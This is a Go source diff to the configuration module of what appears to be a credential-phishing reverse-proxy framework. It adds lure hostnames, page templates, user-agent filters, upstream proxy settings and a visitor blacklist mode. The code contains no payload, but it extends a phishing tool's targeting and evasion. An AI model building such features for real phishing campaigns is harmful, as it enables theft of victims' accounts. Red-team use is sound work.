@@ -12,21 +12,30 @@ import (
 )
 
 type Lure struct {
-	Path          string            `mapstructure:"path" yaml:"path"`
-	RedirectUrl   string            `mapstructure:"redirect_url" yaml:"redirect_url"`
-	Phishlet      string            `mapstructure:"phishlet" yaml:"phishlet"`
-	Info          string            `mapstructure:"info" yaml:"info"`
-	OgTitle       string            `mapstructure:"og_title" yaml:"og_title"`
-	OgDescription string            `mapstructure:"og_desc" yaml:"og_desc"`
-	OgImageUrl    string            `mapstructure:"og_image" yaml:"og_image"`
-	OgUrl         string            `mapstructure:"og_url" yaml:"og_url"`
-	Params        map[string]string `mapstructure:"params" yaml:"params"`
+	Hostname        string `mapstructure:"hostname" yaml:"hostname"`
+	Path            string `mapstructure:"path" yaml:"path"`
+	RedirectUrl     string `mapstructure:"redirect_url" yaml:"redirect_url"`
+	Phishlet        string `mapstructure:"phishlet" yaml:"phishlet"`
+	Template        string `mapstructure:"template" yaml:"template"`
+	UserAgentFilter string `mapstructure:"ua_filter" yaml:"ua_filter"`
+	Info            string `mapstructure:"info" yaml:"info"`
+	OgTitle         string `mapstructure:"og_title" yaml:"og_title"`
+	OgDescription   string `mapstructure:"og_desc" yaml:"og_desc"`
+	OgImageUrl      string `mapstructure:"og_image" yaml:"og_image"`
+	OgUrl           string `mapstructure:"og_url" yaml:"og_url"`
 }
 
 type Config struct {
 	siteDomains       map[string]string
 	baseDomain        string
 	serverIP          string
+	proxyType         string
+	proxyAddress      string
+	proxyPort         int
+	proxyUsername     string
+	proxyPassword     string
+	blackListMode     string
+	proxyEnabled      bool
 	sitesEnabled      map[string]bool
 	sitesHidden       map[string]bool
 	phishlets         map[string]*Phishlet
@@ -36,6 +45,7 @@ type Config struct {
 	verificationParam string
 	verificationToken string
 	redirectUrl       string
+	templatesDir      string
 	lures             []*Lure
 	cfg               *viper.Viper
 }
@@ -51,6 +61,13 @@ const (
 	CFG_VERIFICATION_TOKEN = "verification_token"
 	CFG_REDIRECT_URL       = "redirect_url"
 	CFG_LURES              = "lures"
+	CFG_PROXY_TYPE         = "proxy_type"
+	CFG_PROXY_ADDRESS      = "proxy_address"
+	CFG_PROXY_PORT         = "proxy_port"
+	CFG_PROXY_USERNAME     = "proxy_username"
+	CFG_PROXY_PASSWORD     = "proxy_password"
+	CFG_PROXY_ENABLED      = "proxy_enabled"
+	CFG_BLACKLIST_MODE     = "blacklist_mode"
 )
 
 const DEFAULT_REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
@@ -75,8 +92,10 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	if err != nil {
 		return nil, err
 	}
+	var created_cfg bool = false
 	c.cfg.SetConfigFile(path)
 	if _, err := os.Stat(path); os.IsNotExist(err) {
+		created_cfg = true
 		err = c.cfg.WriteConfigAs(path)
 		if err != nil {
 			return nil, err
@@ -95,6 +114,13 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.verificationParam = c.cfg.GetString(CFG_VERIFICATION_PARAM)
 	c.verificationToken = c.cfg.GetString(CFG_VERIFICATION_TOKEN)
 	c.redirectUrl = c.cfg.GetString(CFG_REDIRECT_URL)
+	c.proxyType = c.cfg.GetString(CFG_PROXY_TYPE)
+	c.proxyAddress = c.cfg.GetString(CFG_PROXY_ADDRESS)
+	c.proxyPort = c.cfg.GetInt(CFG_PROXY_PORT)
+	c.proxyUsername = c.cfg.GetString(CFG_PROXY_USERNAME)
+	c.proxyPassword = c.cfg.GetString(CFG_PROXY_PASSWORD)
+	c.proxyEnabled = c.cfg.GetBool(CFG_PROXY_ENABLED)
+	c.blackListMode = c.cfg.GetString(CFG_BLACKLIST_MODE)
 	s_enabled := c.cfg.GetStringSlice(CFG_SITES_ENABLED)
 	for _, site := range s_enabled {
 		c.sitesEnabled[site] = true
@@ -102,6 +128,10 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	s_hidden := c.cfg.GetStringSlice(CFG_SITES_HIDDEN)
 	for _, site := range s_hidden {
 		c.sitesHidden[site] = true
+	}
+
+	if !stringExists(c.blackListMode, []string{"all", "unauth", "off"}) {
+		c.SetBlacklistMode("off")
 	}
 
 	var param string
@@ -121,7 +151,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	if c.verificationToken == "" {
 		c.SetVerificationToken(GenRandomToken()[:4])
 	}
-	if c.redirectUrl == "" {
+	if c.redirectUrl == "" && created_cfg {
 		c.SetRedirectUrl(DEFAULT_REDIRECT_URL)
 	}
 	c.lures = []*Lure{}
@@ -162,6 +192,68 @@ func (c *Config) SetServerIP(ip_addr string) {
 	c.cfg.Set(CFG_SERVER_IP, c.serverIP)
 	log.Info("server IP set to: %s", ip_addr)
 	c.cfg.WriteConfig()
+}
+
+func (c *Config) EnableProxy(enabled bool) {
+	c.proxyEnabled = enabled
+	c.cfg.Set(CFG_PROXY_ENABLED, c.proxyEnabled)
+	if enabled {
+		log.Info("enabled proxy")
+	} else {
+		log.Info("disabled proxy")
+	}
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetProxyType(ptype string) {
+	ptypes := []string{"http", "https", "socks5", "socks5h"}
+	if !stringExists(ptype, ptypes) {
+		log.Error("invalid proxy type selected")
+		return
+	}
+	c.proxyType = ptype
+	c.cfg.Set(CFG_PROXY_TYPE, c.proxyType)
+	log.Info("proxy type set to: %s", c.proxyType)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetProxyAddress(address string) {
+	c.proxyAddress = address
+	c.cfg.Set(CFG_PROXY_ADDRESS, c.proxyAddress)
+	log.Info("proxy address set to: %s", c.proxyAddress)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetProxyPort(port int) {
+	c.proxyPort = port
+	c.cfg.Set(CFG_PROXY_PORT, c.proxyPort)
+	log.Info("proxy port set to: %d", c.proxyPort)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetProxyUsername(username string) {
+	c.proxyUsername = username
+	c.cfg.Set(CFG_PROXY_USERNAME, c.proxyUsername)
+	log.Info("proxy username set to: %s", c.proxyUsername)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetProxyPassword(password string) {
+	c.proxyPassword = password
+	c.cfg.Set(CFG_PROXY_PASSWORD, c.proxyPassword)
+	log.Info("proxy password set to: %s", c.proxyPassword)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) IsLureHostnameValid(hostname string) bool {
+	for _, l := range c.lures {
+		if l.Hostname == hostname {
+			if c.sitesEnabled[l.Phishlet] {
+				return true
+			}
+		}
+	}
+	return false
 }
 
 func (c *Config) SetSiteEnabled(site string) error {
@@ -231,6 +323,10 @@ func (c *Config) SetSiteHidden(site string, hide bool) error {
 	return nil
 }
 
+func (c *Config) SetTemplatesDir(path string) {
+	c.templatesDir = path
+}
+
 func (c *Config) ResetAllSites() {
 	for s, _ := range c.sitesEnabled {
 		c.SetSiteDisabled(s)
@@ -273,6 +369,15 @@ func (c *Config) SetRedirectParam(param string) {
 	c.cfg.WriteConfig()
 }
 
+func (c *Config) SetBlacklistMode(mode string) {
+	if stringExists(mode, []string{"all", "unauth", "off"}) {
+		c.blackListMode = mode
+		c.cfg.Set(CFG_BLACKLIST_MODE, mode)
+		c.cfg.WriteConfig()
+	}
+	log.Info("blacklist mode set to: %s", mode)
+}
+
 func (c *Config) SetVerificationParam(param string) {
 	c.verificationParam = param
 	c.cfg.Set(CFG_VERIFICATION_PARAM, param)
@@ -304,6 +409,13 @@ func (c *Config) refreshActiveHostnames() {
 		}
 		for _, host := range pl.GetPhishHosts() {
 			c.activeHostnames = append(c.activeHostnames, host)
+		}
+	}
+	for _, l := range c.lures {
+		if stringExists(l.Phishlet, sites) {
+			if l.Hostname != "" {
+				c.activeHostnames = append(c.activeHostnames, l.Hostname)
+			}
 		}
 	}
 }
@@ -421,4 +533,12 @@ func (c *Config) GetBaseDomain() string {
 
 func (c *Config) GetServerIP() string {
 	return c.serverIP
+}
+
+func (c *Config) GetTemplatesDir() string {
+	return c.templatesDir
+}
+
+func (c *Config) GetBlacklistMode() string {
+	return c.blackListMode
 }
